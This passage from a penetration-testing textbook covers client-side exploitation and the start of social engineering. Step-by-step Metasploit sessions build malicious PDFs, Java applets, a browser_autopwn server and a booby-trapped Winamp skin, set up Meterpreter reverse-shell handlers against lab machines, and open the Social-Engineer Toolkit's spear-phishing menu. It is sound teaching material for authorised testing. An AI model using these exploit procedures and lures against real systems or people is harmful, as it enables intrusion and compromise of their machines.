during which the user could close the browser and kill our session. Fortunately, 
the advanced Meterpreter option PrependMigrate, shown here, will migrate 
even faster, before the payload is run. 
 Name : PrependMigrate
 Current Setting: false
 Description : Spawns and runs shellcode in new process
You can set this option to true as an alternative to the AutoRunScript we 
used earlier. 
This has been just one example of a browser exploit. Metasploit has 
other modules for exploiting vulnerabilities in Internet Explorer as well 
as other popular web browsers. As more organizations have hardened their 
external security posture, browser exploitation has given over the keys to 
the kingdom in many pentests as well as attacks. 
N ote The Aurora vulnerability was patched in 2010, but users and organizations are
bad at keeping their browsers up to date, so this exploit still finds targets today. 
Additionally, though new remote exploits for operating systems are rare, major 
browsers such as Internet Explorer fall victim to new client-side attacks on a regular 
basis. Use Msfupdate as discussed in Chapter 4 to get the latest modules for new 
vulnerabilities, some of which may not even be patched by the vendor at the time of 
the module‚Äôs release. Note that running Msfupdate may affect how Metasploit works, 
which may make it more difficult to follow along with the book. Therefore, you may 
not want to update Metasploit until after you have read through the book.
Now let‚Äôs look at some other client-side software that can be exploited 
to gain command execution on a target system. 
PDF Exploits 
Portable Document Format (PDF) software can also be exploited. If a 
user can be enticed to open a malicious PDF in a vulnerable viewer, the 
program can be exploited. 
The most popular PDF viewer for Windows systems is Adobe Reader. 
Like browsers, Adobe Reader has a history littered with security holes. Also 
like browsers, even when a patch-management process is in place, regularly updating the underlying operating system, PDF software is often forgotten, and remains at an older, vulnerable version. 
226 Chapter 10
Exploiting a PDF Vulnerability
Our Windows XP target has an outdated version of Adobe Reader 8.1.2 
installed that is subject to CVE-2008-2992, a stack-based buffer overflow. The corresponding Metasploit module is exploit/windows/fileformat/
adobe_utilprintf. 
The options for this module are a bit different than anything we‚Äôve 
seen thus far, as shown in Listing 10-10. This is a client-side attack, so there 
is no RHOST option, but unlike our browser attack, there are also no SRVHOST
or SRVPORT options. This module simply creates a malicious PDF; hosting it 
for delivery and setting up a payload handler is up to us. Of course, we have 
all the skills necessary to perform both these tasks easily. 
msf > use exploit/windows/fileformat/adobe_utilprintf
msf exploit(adobe_utilprintf) > show options
Module options (exploit/windows/fileformat/adobe_utilprintf):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 uFILENAME msf.pdf yes The file name.
Exploit target:
 Id Name
 -- ----
 v0 Adobe Reader v8.1.2 (Windows XP SP3 English)
msf exploit(adobe_utilprintf) > exploit
[*] Creating 'msf.pdf' file...
[+] msf.pdf stored at /root/.msf4/local/msf.pdf w
Listing 10-10: A Metasploit PDF exploit 
As you can see, the only option for the PDF exploit is the name of the 
malicious file to be generated u. We can leave the default, msf.pdf. For this 
example, we‚Äôll have Metasploit use the default payload, windows/meterpreter/
reverse_tcp on port 4444. When we enter exploit, Metasploit generates a PDF 
that will exploit this vulnerability in a vulnerable version of Adobe Reader 
on Windows XP SP3 English v. The malicious PDF is stored as /root/.msf4/
local/msf.pdf w. 
Now we need to serve the PDF and set up a handler for the payload, as 
shown in Listing 10-11. 
msf exploit(adobe_utilprintf) > cp /root/.msf4/local/msf.pdf /var/www
[*] exec: cp /root/.msf4/local/msf.pdf /var/www
msf exploit(adobe_utilprintf) > service apache2 start
[*] exec service apache2 start
Client-Side Exploitation 227
Starting web server: apache2.
msf exploit(adobe_utilprintf) > use multi/handleru
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.20.9
lhost => 192.168.20.9
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1422) at 
2015-05-05 20:26:15 -0400 v
Listing 10-11: Serving the malicious PDF and using a handler
We copy the file to the Apache web server folder and start the server, 
if it is not already running. We‚Äôll look at ways to lure users into opening 
malicious files later in this chapter, but for now we‚Äôll just open the malicious PDF in Adobe Reader 8.1.2 on our Windows XP target. First, though, 
we need to set up a handler for the payload. We can use the multi/handler u
module as we learned in Chapter 4. (Be sure to kill the Aurora job if its 
handler is also listening on port 4444 to free up this port for multi/handler
use). When we open the malicious PDF, we again receive a session v. 
Typically with an attack like this we won‚Äôt be targeting just one user. For 
best results we might use this malicious PDF as part of a social-engineering 
campaign, as discussed in the next chapter, by sending out a few to even hundreds of malicious PDFs in an attempt to entice users to open them. The 
multi/handler listener we set up previously will close as soon as it sees the 
first connection, causing us to miss any other connections that come in from 
other users opening the PDF. It would be much better if we could leave our 
listener open to catch additional incoming connections.
As it turns out, an advanced option for the multi/handler module solves 
this problem. As shown in Listing 10-12, the advanced option ExitOnSession, 
which is set to true by default, specifies whether the listener closes after it 
receives a session. If we set this option to false, the listener will stay open 
and allow us to catch multiple sessions with a single handler. 
msf exploit(handler) > show advanced
Module advanced options:
--snip--
 Name : ExitOnSession
 Current Setting: true
 Description : Return from the exploit after a session has been created
msf exploit(handler) > set ExitOnSession falseu
ExitOnSession => false
msf exploit(handler) > exploit -jv
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.20.9:4444
[*] Starting the payload handler...
Listing 10-12: Keeping the handler open for multiple sessions
228 Chapter 10
Set ExitOnSession to false in the usual way u. One side effect of this 
option is that if we, say, exploit and start the listener in the foreground, 
it will never close, so we will be stuck without an Msfconsole prompt 
indefinitely. For this reason, Metasploit will complain and note that you 
should use the -j option with exploit v to run the handler as a job, in the 
background. This way you can continue to use Msfconsole while the handler 
catches any incoming shells in the background. To close the handler in 
the future, use jobs, followed by kill <job number> as we did in the Aurora 
example.
This exploit and the Aurora browser example discussed earlier both 
rely on a missing security patch. Here we‚Äôve exploited a security vulnerability to hijack control of the program and execute malicious code by tricking 
the user into letting us run malicious code. If the user will allow us to run 
code, a vulnerability in the PDF software becomes unnecessary. 
PDF Embedded Executable
Now for another PDF attack: This time we‚Äôll embed a malicious executable 
inside a PDF. The corresponding Metasploit module is exploit/windows/
fileformat/adobe_pdf_embedded_exe, as shown in Listing 10-13. Instead of 
exploiting the software as soon as the PDF is opened, the generated PDF 
will prompt the user for permission to run the embedded file. The success 
of our attack is contingent on the user allowing our executable to run. 
msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe
msf exploit(adobe_pdf_embedded_exe) > show options
Module options (exploit/windows/fileformat/adobe_pdf_embedded_exe):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 uEXENAME no The Name of payload exe.
 vFILENAME evil.pdf no The output filename.
 wINFILENAME yes The Input PDF filename.
 xLAUNCH_MESSAGE To view the encrypted content please no The message to display in 
 tick the "Do not show this message the File: area 
 again" box and press Open. 
--snip--
Listing 10-13: PDF embedded EXE module
The module lets us specify a prebuilt executable file with the EXENAME u
option. If we don‚Äôt set this option, we can embed an .exe file created from 
whatever payload we select. We can again change the filename to anything 
we like or leave the value as the default v. To use this module, we must 
use an input PDF for the INFILENAME w option. The LAUNCH_MESSAGE x option 
is the text that will be shown to the user as part of the prompt to run the 
executable. 
Set the relevant options, as shown in Listing 10-14.
Client-Side Exploitation 229
msf exploit(adobe_pdf_embedded_exe) > set INFILENAME /usr/share/set/readme/User_Manual.pdfu
INFILENAME => /usr/share/set/readme/User_Manual.pdf
msf exploit(adobe_pdf_embedded_exe) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(adobe_pdf_embedded_exe) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(adobe_pdf_embedded_exe) > exploit
[*] Reading in '/usr/share/set/readme/User_Manual.pdf'...
[*] Parsing '/usr/share/set/readme/User_Manual.pdf'...
[*] Using 'windows/meterpreter/reverse_tcp' as payload...
[*] Parsing Successful. Creating 'evil.pdf' file...
[+] evil.pdf stored at /root/.msf4/local/evil.pdfv
Listing 10-14: Setting module options and creating the malicious PDF
We‚Äôll use a PDF included with Kali Linux for our example: the Metasploit 
user guide at /user/share/set/readme/User_Manual.pdf u. The generated PDF is 
again stored in the /root/msf4/local/ directory v. (Be sure to set up a handler 
for the payload with the multi/handler module before opening the PDF on 
the Windows XP target. For a refresher, see Listing 10-11.)
note The previous exploit may have left Adobe Reader in a bad state, so you may need to 
restart Windows XP to get it to properly load the new PDF.
When the malicious PDF is opened, the user sees a warning like the one 
shown in Figure 10-1. The user must click Open for the embedded executable 
to run. This attack depends on users being willing to click through this warning. 
Figure 10-1: PDF embedded executable user warning
230 Chapter 10
Once you click Open in the PDF warning, the payload will run, and you 
will receive a session. 
Java Exploits 
Java vulnerabilities are a prevalent client-side attack vector. In fact, some 
experts suggest that in light of the security issues that plague Java, users 
should uninstall or disable the software in their browsers. 
One thing that makes Java attacks so powerful is that one exploit can 
gain access to multiple platforms. Windows, Mac, and even Linux systems 
running the Java Runtime Environment (JRE) in a browser can all be 
exploited by exactly the same exploit when that browser opens a malicious 
page. Here are some sample exploits.
Java Vulnerability
As exhibit number one, we‚Äôll use the Metasploit module exploit/multi/browser/
java_jre17_jmxbean, as shown in Listing 10-15. Use of this module is similar 
to that of the Internet Explorer Aurora exploit shown earlier in this chapter. Metasploit sets up a malicious server to exploit this cross-platform vulnerability on any browser that arrives at the page. Any browser running Java 
version 7 before update 11 is affected.
msf > use exploit/multi/browser/java_jre17_jmxbean
msf exploit(java_jre17_jmxbean) > show options
Module options (exploit/multi/browser/java_jre17_jmxbean):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address 
 on the local machine or 0.0.0.0
 SRVPORT 8080 yes The local port to listen on.
--snip--
 URIPATH no The URI to use for this exploit (default is random)
Exploit target:
 Id Name
 -- ----
 0 Generic (Java Payload)
msf exploit(java_jre17_jmxbean) > set SRVHOST 192.168.20.9
SRVHOST => 10.0.1.9
msf exploit(java_jre17_jmxbean) > set SRVPORT 80
SRVPORT => 80
msf exploit(java_jre17_jmxbean) > set URIPATH javaexploit
URIPATH => javaexploit
msf exploit(java_jre17_jmxbean) > show payloadsu
Client-Side Exploitation 231
Compatible Payloads
===================
 Name Disclosure Date Rank Description
 ---- --------------- ---- -----------
--snip--
 java/meterpreter/bind_tcp normal Java Meterpreter, Java Bind TCP 
 Stager
 java/meterpreter/reverse_http normal Java Meterpreter, Java Reverse HTTP 
 Stager
 java/meterpreter/reverse_https normal Java Meterpreter, Java Reverse 
 HTTPS Stager
 java/meterpreter/reverse_tcp normal Java Meterpreter, Java Reverse TCP 
 Stager
 java/shell_reverse_tcp normal Java Command Shell, Reverse TCP 
 Inline
--snip--
msf exploit(java_jre17_jmxbean) > set payload java/meterpreter/reverse_httpv
payload => java/meterpreter/reverse_http
Listing 10-15: Setting up a Java exploit 
Set the options to match your environment. Set the SRVHOST option 
to the local IP address, and change the SRVPORT, if you would like. Set the 
URIPATH to something that will be easy to type in your target browser. 
Notice that because this exploit is multi-platform and the code execution takes place entirely inside the JRE, our payload options are Java-based. 
The usual suspects are all here, from staged payloads, inline payloads, bind 
shells, reverse shells, Meterpreter, and so on, as shown in the list of payloads 
at u. We‚Äôll use the payload java/meterpreter/reverse_http, which uses legitimate 
HTTP traffic v. Its options are shown in Listing 10-16.
msf exploit(java_jre17_jmxbean) > show options
Module options (exploit/multi/browser/java_jre17_jmxbean):
--snip--
Payload options (java/meterpreter/reverse_http):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 LHOST yes The local listener hostname
 LPORT 8080 yes The local listener port
Exploit target:
 Id Name
 -- ----
 0 Generic (Java Payload)
232 Chapter 10
msf exploit(java_jre17_jmxbean) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(java_jre17_jmxbean) > exploit
[*] Exploit running as background job.
[*] Started HTTP reverse handler on http://192.168.20.9:8080/
[*] Using URL: http://192.168.20.9:80/javaexploit
[*] Server started.
msf exploit(java_jre17_jmxbean) > [*] 192.168.20.12 java_jre17_jmxbean - handling 
request for /javaexploit
[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/
[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar
[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar
[*] 192.168.20.12:49188 Request received for /INITJM...
[*] Meterpreter session 1 opened (192.168.20.9:8080 -> 192.168.20.12:49188) at 2015-05-05 
19:15:19 -0400
Listing 10-16: Exploiting a Java vulnerability with an HTTP payload 
These options should look familiar. The default LPORT option is now 
8080 instead of 4444. Notice that both SRVPORT and LPORT default to 8080, 
so we‚Äôll need to change at least one of them. 
After you‚Äôve finished setting options, start the exploit server and browse 
to the malicious page from your Windows 7 target. Either Internet Explorer 
or Mozilla Firefox will fall victim to this attack as long as you have enabled 
the vulnerable Java browser plugin. 
One of the great features of the HTTP and HTTPS Meterpreter payloads, aside from being legitimate HTTP and HTTPS traffic and thus 
bypassing even some traffic-inspecting filters, is their ability to reattach to 
a dropped session. (Network problems can cause sessions to spontaneously 
die‚Äîa big annoyance for pentesters.) We‚Äôll examine other ways to gain 
persistent access in Chapter 13, but for now let‚Äôs detach our Meterpreter 
session, as shown in Listing 10-17. 
msf exploit(java_jre17_jmxbean) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > detach
[*] 10.0.1.16 - Meterpreter session 1 closed. Reason: User exit
msf exploit(java_jre17_jmxbean) > 
[*] 192.168.20.12:49204 Request received for /WzZ7_vgHcXA6kWjDi4koK/...
[*] Incoming orphaned session WzZ7_vgHcXA6kWjDi4koK, reattaching...
[*] Meterpreter session 2 opened (192.168.20.9:8080 -> 192.168.20.12:49204) at 
2015-05-05 19:15:45 -0400 u
Listing 10-17: Detaching the HTTP Meterpreter session 
As you can see, the handler for the HTTP Meterpreter payload is still 
running in the background. Wait a few seconds, and you should see a new 
session open without the user needing to revisit the attack page as shown 
at u. Unless the session has been formally exited, the payload will continue 
Client-Side Exploitation 233
to try to connect back to Metasploit. (You can specify how long the session tries to reconnect with the SessionCommunicationTimeOut parameter, an 
advanced option for the payload.)
But what if your pentest target is diligent in updating Java, and there 
are currently no zero-days for the software floating around the Internet? 
Signed Java Applet
Much like the attack against PDF users discussed in ‚ÄúPDF Embedded 
Executable‚Äù on page 228, we can bypass the need for an unpatched Java 
vulnerability by simply asking users to allow us to run malicious code. 
You‚Äôve probably seen browser warnings like, ‚ÄúThis site would like to run 
this thing in your browser, how would you like to proceed?‚Äù Sometimes 
even security-savvy users can be convinced to just say ‚ÄúYes‚Äù and bypass this 
warning without further investigation if they can be convinced that what‚Äôs 
on the other side is useful. 
The module we‚Äôll use for this example is exploit/multi/browser/java_
signed_applet. As the name implies, this module will create a malicious Java 
applet, as shown in Listing 10-18. 
msf exploit(java_jre17_jmxbean) > use exploit/multi/browser/java_signed_applet
msf exploit(java_signed_applet) > show options
Module options (exploit/multi/browser/java_signed_applet):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 APPLETNAME SiteLoader yes The main applet's class name.
 uCERTCN SiteLoader yes The CN= value for the certificate. Cannot contain 
 ',' or '/'
 SRVHOST 0.0.0.0 yes The local host to listen on. This must be an 
 address on the local machine or 0.0.0.0
 SRVPORT 8080 yes The local port to listen on.
 SSL false no Negotiate SSL for incoming connections
 SSLCert no Path to a custom SSL certificate (default is 
 randomly generated)
 SSLVersion SSL3 no Specify the version of SSL that should be used 
 (accepted: SSL2, SSL3, TLS1)
 vSigningCert no Path to a signing certificate in PEM or PKCS12 
 (.pfx) format
 SigningKey no Path to a signing key in PEM format
 SigningKeyPass no Password for signing key (required if SigningCert 
 is a .pfx)
 URIPATH no The URI to use for this exploit (default is 
 random)
Exploit target:
 Id Name
 -- ----
 w1 Windows x86 (Native Payload)
234 Chapter 10
msf exploit(java_signed_applet) > set APPLETNAME BulbSec
APPLETNAME => Bulb Security
msf exploit(java_signed_applet) > set SRVHOST 192.168.20.9
SRVHOST => 192.168.20.9 
msf exploit(java_signed_applet) > set SRVPORT 80
SRVPORT => 80
Listing 10-18: Metasploit signed Java applet module
Older versions of Java will allow us to use the CERTCN option shown at u to 
say that the applet is signed by any entity that we choose. Newer versions of 
Java, like the one installed on the Windows 7 target, will say that the signer 
is unknown unless we sign the applet with a trusted signing certificate, 
which we can specify at v. If this option is set, it will override the CERTCN
option. If we have a trusted signing certificate or we‚Äôve compromised a certificate from our target, we can make our applet look more legitimate, but 
we‚Äôll leave our applet self-signed for this example. 
As shown at w, the default target for this module is a Windows system. 
However, as shown in Listing 10-19, we can use payloads for other platforms 
running JRE.
msf exploit(java_signed_applet) > show targets
Exploit targets:
 Id Name
 -- ----
 u0 Generic (Java Payload)
 1 Windows x86 (Native Payload)
 2 Linux x86 (Native Payload)
 3 Mac OS X PPC (Native Payload)
 4 Mac OS X x86 (Native Payload)
msf exploit(java_signed_applet) > set target 0
target => 0
msf exploit(java_signed_applet) > set payload java/meterpreter/reverse_tcp
payload => java/meterpreter/reverse_tcp
msf exploit(java_signed_applet) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(java_signed_applet) > exploit
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.20.9:4444 
[*] Using URL: http://192.168.20.9:80/Dgrz12PY
[*] Server started.
Listing 10-19: Using a Java payload
Client-Side Exploitation 235
As with other Java exploits, we can make this attack multi-platform. We 
can change the target to Linux or Mac OS, or use a Java payload u that 
will target them all. 
note As with our PDF examples, the previous exploit has left Java in a bad state, and you 
may need to restart Windows 7 before attempting to run the applet.
Browse to the Metasploit server from your Windows 7 target, and you 
should be prompted to run the applet, as shown in Figure 10-2. The security warning informs you that if this applet is malicious, it will have access 
to the system and lets you know you should run the application only if 
the publisher is trusted. Because we didn‚Äôt use a signing certificate that is 
trusted by the browser certificate chain, the warning says in big letters that 
the publisher is unknown. This should stop anyone from running the malicious applet, right? 
Figure 10-2: Java applet attack 
Despite the warnings, the Social-Engineer Toolkit (which we‚Äôll explore 
in the next chapter) claims that this attack is one of the most successful of 
the many available, even though it doesn‚Äôt rely on any unpatched vulnerability in Java or the underlying operating system. 
browser_autopwn
The browser_autopwn module is another client-side exploitation option 
available in Metasploit. Although it‚Äôs sometimes considered cheating, this 
module loads all the browser and browser add-on modules that it knows 
236 Chapter 10
of (including Java, Flash, and so on) and waits for a browser to connect to 
the server. Once the browser connects, the server fingerprints the browser 
and serves up all the exploits it thinks are likely to succeed. An example is 
shown in Listing 10-20. 
msf > use auxiliary/server/browser_autopwn 
msf auxiliary(browser_autopwn) > show options
Module options (auxiliary/server/browser_autopwn):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 LHOST yes The IP address to use for reverse-connect payloads
 SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address 
 on the local machine or 0.0.0.0
 SRVPORT 8080 yes The local port to listen on.
 SSL false no Negotiate SSL for incoming connections
 SSLCert no Path to a custom SSL certificate (default is randomly 
 generated)
 SSLVersion SSL3 no Specify the version of SSL that should be used 
 (accepted: SSL2, SSL3, TLS1)
 URIPATH no The URI to use for this exploit (default is random)
msf auxiliary(browser_autopwn) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf auxiliary(browser_autopwn) > set URIPATH autopwn
URIPATH => autopwn
msf auxiliary(browser_autopwn) > exploit
[*] Auxiliary module execution completed
[*] Setup
msf auxiliary(browser_autopwn) > 
[*] Obfuscating initial javascript 2015-03-25 12:55:22 -0400
[*] Done in 1.051220065 seconds
[*] Starting exploit modules on host 192.168.20.9...
--snip--
[*] --- Done, found 16 exploit modules
[*] Using URL: http://0.0.0.0:8080/autopwn
[*] Local IP: http://192.168.20.9:8080/autopwn
[*] Server started.
Listing 10-20: Starting browser_autopwn
Our options for this module are the usual client-side attacks. As shown 
here, I‚Äôve set the LHOST for my shells to call back to Kali‚Äôs IP address, and 
URIPATH to something easy to remember (autopwn). Note that we don‚Äôt need 
to set any payloads here; as the individual modules are loaded, Metasploit 
sets the payload options appropriately. 
Client-Side Exploitation 237
With the server started, browse to the malicious page from a web 
browser. I used Internet Explorer on my Windows 7 target as shown in 
Listing 10-21.
[*] 192.168.20.12 browser_autopwn - Handling '/autopwn'
[*] 192.168.20.12 browser_autopwn - Handling '/autopwn?sessid=TWljcm9zb2Z0IFdpbmRvd3M6NzpTUDE6
ZW4tdXM6eDg2Ok1TSUU6OC4wOg%3d%3d'
[*] 192.168.20.12 browser_autopwn - JavaScript Report: Microsoft Windows:7:SP1:en-us:x86:
MSIE:8.0: u
[*] 192.168.20.12 browser_autopwn - Responding with 14 exploits v
[*] 192.168.20.12 java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation 
Vulnerability
--snip--
msf auxiliary(browser_autopwn) > sessions -l
Active sessions
===============
 Id Type Information Connection
 -- ---- ----------- ----------
 1 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 -> 
 192.168.20.12:49195 (192.168.20.12)
 2 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 -> 
 192.168.20.12:49202 (192.168.20.12)
 3 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 -> 
 192.168.20.12:49206 (192.168.20.12)
 4 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 -> 
 192.168.20.12:49209 (192.168.20.12)
Listing 10-21: Autopwning a browser
As you can see Metasploit notices my browser and attempts to detect 
its version and running software u. It then sends all the exploits it thinks 
might be effective v.
Once all is said and done, run sessions -l to see how things turned out. 
In my case, I received four new sessions. Not bad for so little work. As you 
might expect though, all of those exploits overwhelmed the browser and it 
crashed. (Luckily, all of our sessions were automatically migrated.) 
Though browser_autopwn is not nearly as stealthy or elegant as performing reconnaissance and then choosing a particular exploit likely to work 
against a target, it can be a real help in a pinch, which is why it‚Äôs worth having in your pentesting arsenal. 
Winamp 
So far our client-side attacks have basically followed the same pattern. We 
generate a malicious file that exploits a vulnerability in the client software 
or prompts the user for permission to run malicious code. The user opens 
the file with the relevant program, and we get a session in Metasploit. Now 
for something a bit different. 
238 Chapter 10
In this example, we trick the user into replacing a configuration file 
for the Winamp music player program. When the user next opens the program, the evil configuration file will be processed regardless of which music 
file the user opens. The Metasploit module we‚Äôll use is exploit/windows/
fileformat/winamp_maki_bof, which exploits a buffer overflow issue in 
Winamp version 5.55. 
As you can see with show options in Listing 10-22, this module has no 
options to set; all we need is a Windows payload. The module generates a 
malicious Maki file for use with Winamp skins. As with our PDF examples, 
it‚Äôs up to us to serve the file and set up a handler for the payload. 
msf > use exploit/windows/fileformat/winamp_maki_bof
msf exploit(winamp_maki_bof) > show options
Module options (exploit/windows/fileformat/winamp_maki_bof):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
Exploit target:
 Id Name
 -- ----
 0 Winamp 5.55 / Windows XP SP3 / Windows 7 SP1
msf exploit(winamp_maki_bof) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(winamp_maki_bof) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(winamp_maki_bof) > exploit
[*] Creating 'mcvcore.maki' file ...
[+] mcvcore.maki stored at /root/.msf4/local/mcvcore.maki
Listing 10-22: Metasploit Winamp exploit 
Choose a compatible Windows payload as shown. Once the malicious 
Maki file has been generated, copy it to the Apache web server directory, and 
set up a payload handler. (An example of setting up the handler is included 
in Listing 10-11 on page 227.) Now we need to package this malicious file in 
such a way that a user may be convinced to load it in Winamp. We can create 
a new Winamp skin by copying one of the skins packaged with Winamp. We 
can replace the mcvcore.maki file from our example skin with our malicious 
one. It doesn‚Äôt matter what our skin actually looks like, because it will cause 
Winamp to hang and send us our session in Metasploit. 
Client-Side Exploitation 239
In Windows 7, make a copy of the default Bento Winamp skin folder 
from C:\Program Files\Winamp\Skins and copy it to Kali. Rename the folder 
Bento to Rocketship. Replace the file Rocketship\scripts\mcvcore.maki with the 
malicious file we just created in Metasploit. Zip the folder and copy it to 
the web server. In the next chapter we will look at methods of creating 
believable social-engineering campaigns, but suffice it to say, if we can 
convince users that this malicious skin will make their Winamp look like 
a rocket ship, we might be able to convince users to install it. 
Switch to Windows 7, download the zipped skin from the Kali web 
server, unzip it, and save the folder to C:\Program Files\Winamp\Skins as 
shown in Figure 10-3. 
Figure 10-3: Installing the malicious Winamp skin
Now open Winamp, go to Options4Skins, and choose Rocketship, as 
shown in Figure 10-4. 
Once you select the malicious skin, Winamp will appear to close, and 
you will receive a session in your Metasploit handler. 
240 Chapter 10
Figure 10-4: Using the malicious skin
Summar
The attacks we‚Äôve seen in this chapter target software that is not listening 
on a network port. We attacked browsers, PDF viewers, the Java browser 
plugin, and a music player. We generated malicious files that trigger a 
vulnerability in the client-side software when opened by the user, and we 
looked at examples that ask the user for permission to run malicious code 
instead of relying on an unpatched vulnerability. 
The Internet can be a scary place for client-side software. Some of the 
exploits discussed in this chapter were seen in the wild before a patch was 
issued by the vendors. In fact, the Java exploit we used in ‚ÄúJava Vulnerability‚Äù 
on page 230 was still a zero-day vulnerability when the Metasploit module 
was added to the framework. Anyone using Java 7 could run afoul of a malicious site, even if his or her machine was fully patched, and all an attacker 
had to do was use Metasploit to perform a successful attack. 
Of course, disabling or uninstalling Java fixes this problem in the event 
of a zero-day exploit running rampant on the Internet, but that might not 
be feasible for all users and organizations. Though not all sites use Java, 
popular online meeting software such as WebEx and GoToMeeting require 
Java, and the virtual classroom software Blackboard has Java components as 
Client-Side Exploitation 241
well. A lot of network/security appliances actually require network/security 
admins to run outdated versions of Java, which makes them perfect targets for client-side attacks. Most readers can probably think of at least one 
site that complains if Java is not installed. 
Client-side software is necessary to perform day-to-day tasks in any 
organization, but this software should not be overlooked when evaluating security risks. Keeping all client-side software up-to-date with the latest patches can be a daunting task on your personal computer, much less 
on the computers of an entire organization. Even organizations that are 
doing a good job of applying important Windows security fixes may miss 
an update to Java or Adobe Reader and leave company workstations open to 
client-side attacks. 
All of the attacks in this chapter depend on a legitimate user taking 
action on the target systems. Although we‚Äôve seen what can happen when 
users are tricked into opening malicious files, we‚Äôve yet to look at the 
tricks used to make people open those files. In the next chapter we‚Äôll study 
social engineering‚Äîthat is, ways of tricking users into performing harmful actions such as opening a malicious file, entering credentials into an 
attacker-owned site, or giving out sensitive information over the phone. 

11
Soc ia E nginee r
It is a common saying in information security that 
users are the vulnerability that can never be patched. 
Put all the security controls in place that you want, 
but if an employee can be convinced to give up sensitive company information, it is all for naught. In fact, 
many of the most famous hacks include no system 
exploitation at all. 
For example, consider notorious hacker Kevin Mitnick. Many of Mitnick‚Äôs 
most famous exploits came down to walking into a building, convincing 
the security guard he had permission to be there, and then walking out 
with what he wanted. This kind of attack, called social engineering, exploits 
human vulnerabilities: a desire to be helpful, unawareness of security policies, and so on. 
244 Chapter 11
Social-engineering attacks can involve complex technical requirements 
or no technology at all. A social engineer can buy a cable guy uniform at 
the thrift store and potentially walk into an organization, and even into the 
server room. The IT help desk can receive a frantic call from the boss‚Äôs 
boss‚Äôs assistant, who claims to have locked himself out of his webmail 
account. People generally want to be helpful, so unless there is a secure 
policy in place, the help desk worker may read back the password over the 
phone or set it to a default value, even though the caller is not who he says 
he is. 
A common vector for social-engineering attacks is email. If you are ever 
short on entertainment at work, check out your email spam folder. Among 
the advertisements to make some things bigger and others smaller, you will 
find people trying desperately to give you all their money. I firmly believe 
that if you can find the one African prince who really does want to give you 
his fortune, it will be worth all those times your bank account got hacked 
from answering phishing emails. Joking aside, attempting to trick a user 
into giving up sensitive information by posing as a trusted person via email 
or other electronic means is known as a phishing attack. Phishing emails can 
be used to lure targets to visit malicious sites or download malicious attachments, among other things. Social-engineering attacks are the missing 
element needed to trick users into falling victim to the client-side attacks we 
studied in Chapter 10. 
Companies should put time and effort into training all employees 
about social-engineering attacks. No matter what sort of security technologies you put in place, employees have to be able to use their workstations, 
their mobile devices, and so on to get their job done. They will have access 
to sensitive information or security controls that, in the wrong hands, could 
harm the organization. Some security-awareness training may seem obvious, like ‚ÄúDon‚Äôt share your password with anyone‚Äù and ‚ÄúCheck someone‚Äôs 
badge before you hold the door to a secure area for him or her.‚Äù Other 
security awareness may be new to many employees. For instance, on some 
pentesting engagements, I‚Äôve had great success leaving USB sticks in the 
parking lot or DVDs labeled ‚ÄúPayroll‚Äù on the bathroom floor. Curious users 
start plugging these in, opening files, and giving me access to their systems. 
Security-awareness training about malicious files, USB switchblades, and 
other attacks can help stop users from falling victim to these types of socialengineering attacks. 
The Social-Engineer Too
TrustedSec‚Äôs Social-Engineer Toolkit (SET), an open source Python-driven 
tool, is designed to help you perform social-engineering attacks during pentests. SET will help you create a variety of attacks such as email phishing 
campaigns (designed to steal credentials, financial information, and so on 
using specially targeted email) and web-based attacks (such as cloning a 
client website and tricking users into entering their login credentials). 
Social Engineering 245
SET comes preinstalled in Kali Linux. To start SET in Kali Linux, 
enter setoolkit at a prompt, as shown in Listing 11-1. We‚Äôll use SET to run 
social-engineering attacks, so enter a 1 at the prompt to move to the SocialEngineering Attacks menu. You will be prompted to accept the terms of 
service.
root@kali:~# setoolkit 
--snip--
 Select from the menu:
 1) Social-Engineering Attacks
 2) Fast-Track Penetration Testing
 3) Third Party Modules
--snip--
 99) Exit the Social-Engineer Toolkit
set> 1
Listing 11-1: Starting SET 
In this chapter we‚Äôll look at just a few of the SET attacks that I use regularly on pentesting engagements. We‚Äôll begin with spear-phishing attacks, 
which allow us to deliver attacks via email. 
Spear-Phishing Attac
The Social-Engineering Attacks menu gives us several attack options, as 
shown in Listing 11-2. We‚Äôll create a spear-phishing attack, which will allow 
us to create malicious files for client-side attacks (like the ones covered in 
Chapter 10), email them, and automatically set up a Metasploit handler to 
catch the payload. 
Select from the menu:
 1) Spear-Phishing Attack Vectors u
 2) Website Attack Vectors
 3) Infectious Media Generator
 4) Create a Payload and Listener
 5) Mass Mailer Attack
--snip--
 99) Return back to the main menu.
set> 1
Listing 11-2: Choose Spear-Phishing Attack Vectors
